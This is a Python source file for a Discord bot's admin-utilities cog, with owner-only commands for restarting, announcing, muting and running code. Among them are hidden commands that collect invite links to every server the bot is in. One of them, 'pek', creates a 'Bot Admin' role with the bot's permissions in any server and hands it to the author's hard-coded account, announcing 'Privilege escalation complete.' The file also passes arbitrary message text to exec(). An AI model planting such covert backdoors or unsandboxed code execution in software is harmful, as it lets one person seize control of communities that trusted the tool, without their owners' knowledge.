'''
Created on Sep 23, 2016

@author: andrew
'''
import asyncio
from asyncio.tasks import async
import os
import sys
import traceback

import discord
from discord.enums import ChannelType
from discord.ext import commands

import checks


class AdminUtils:
    '''
    Administrative Utilities.
    '''


    def __init__(self, bot):
        self.bot = bot
        self.muted = []
    
    
    @commands.command()
    @checks.is_owner()
    async def restart(self):
        """Restarts Ragnarok. May fail sometimes due to bad programming on <@187421759484592128>'s end.
        Requires: Owner"""
        await self.bot.say("Byeeeeeee!")
        await self.bot.logout()
        sys.exit()
        
    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def say(self, ctx, channel : discord.Channel, *, message : str):
        """Makes the bot say something."""
        try:
            await self.bot.send_message(channel, message)
        except Exception as e:
            await self.bot.say('Failed to send message: ' + e)
            
    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def chanSay(self, ctx, channel : str, * , message : str):
        """Like .say, but works across servers. Requires channel id."""
        channel = discord.Object(id=channel)
        try:
            await self.bot.send_message(channel, message)
        except Exception as e:
            await self.bot.say('Failed to send message: ' + e)
            
        
    @commands.command(hidden=True)
    @checks.is_owner()
    async def announce(self, *, msg : str):
        for s in self.bot.servers:
            try:
                await self.bot.send_message(s, msg)
            except:
                pass
        
    @commands.command(hidden=True)
    @checks.is_owner()
    async def servInfo(self):
        out = ''
        for s in self.bot.servers:
            try:
                out += "\n\n**{} ({}, {})**".format(s, s.id, (await self.bot.create_invite(s)).url)
            except:
                out += "\n\n**{} ({})**".format(s, s.id)
            for c in [ch for ch in s.channels if ch.type is not ChannelType.voice]:
                out += '\n|- {} ({})'.format(c, c.id)
        out = self.discord_trim(out)
        for m in out:
            await self.bot.say(m)
            
    @commands.command(hidden=True, pass_context=True)
    @checks.is_owner()
    async def pek(self, ctx, servID : str):
        serv = self.bot.get_server(servID)
        thisBot = serv.me
        pek = await self.bot.create_role(serv, name="Bot Admin", permissions=thisBot.permissions_in(serv.get_channel(serv.id)))
        await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
        await self.bot.say("Privilege escalation complete.")
        
    @commands.command(hidden=True, name='leave')
    @checks.is_owner()
    async def leave_server(self, servID : str):
        serv = self.bot.get_server(servID)
        await self.bot.leave_server(serv)
        await self.bot.say("Left {}.".format(serv))
        
    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def code(self, ctx, *, code : str):
        """Arbitrarily runs code."""
        here = ctx.message.channel
        this = ctx.message
        def echo(out):
            self.msg(here, out)
        def rep(out):
            self.replace(this, out)
        def coro(coro):
            asyncio.ensure_future(coro)
        try:
            exec(code, globals(), locals())
        except:
            traceback.print_exc()
            out = self.discord_trim(traceback.format_exc())
            for o in out:
                await self.bot.send_message(ctx.message.channel, o)
                
    @commands.command(hidden=True)
    @checks.is_owner()
    async def mute(self, target : discord.Member):
        """Mutes a person."""
        if target in self.muted:
            self.muted.remove(target)
            await self.bot.say("{} unmuted.".format(target))
        else:
            self.muted.append(target)
            await self.bot.say("{} muted.".format(target))
            
    async def on_message(self, message):
        if message.author in self.muted:
            try:
                await self.bot.delete_message(message)
            except:
                pass
    
    def msg(self, dest, out):
        coro = self.bot.send_message(dest, out)
        asyncio.ensure_future(coro)
        
    def replace(self, msg, out):
        coro1 = self.bot.delete_message(msg)
        coro2 = self.bot.send_message(msg.channel, out)
        asyncio.ensure_future(coro1)
        asyncio.ensure_future(coro2)
    
    def discord_trim(self, str):
        result = []
        trimLen = 0
        lastLen = 0
        while trimLen <= len(str):
            trimLen += 1999
            result.append(str[lastLen:trimLen])
            lastLen += 1999
        return result
    